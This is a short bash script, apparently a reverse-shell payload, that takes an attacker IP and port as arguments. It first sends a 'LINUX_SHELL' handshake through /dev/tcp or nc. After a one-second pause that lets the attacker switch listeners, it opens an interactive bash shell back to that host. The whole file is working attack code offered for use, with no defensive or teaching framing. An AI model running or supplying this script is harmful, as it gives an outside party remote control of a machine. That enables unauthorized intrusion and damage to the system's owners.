#!/bin/bash
if [ "$#" -ne 2 ]; then
    echo -e "Usage: $0 <attacker_ip> <port>"
    exit 1
fi

# 1. Quick handshake
echo "LINUX_SHELL" > /dev/tcp/$1/$2 2>/dev/null || echo "LINUX_SHELL" | nc $1 $2

# 2. Small pause to allow Attacker to switch listeners
sleep 1

# 3. Real connection
bash -c "bash -i >& /dev/tcp/$1/$2 0>&1"
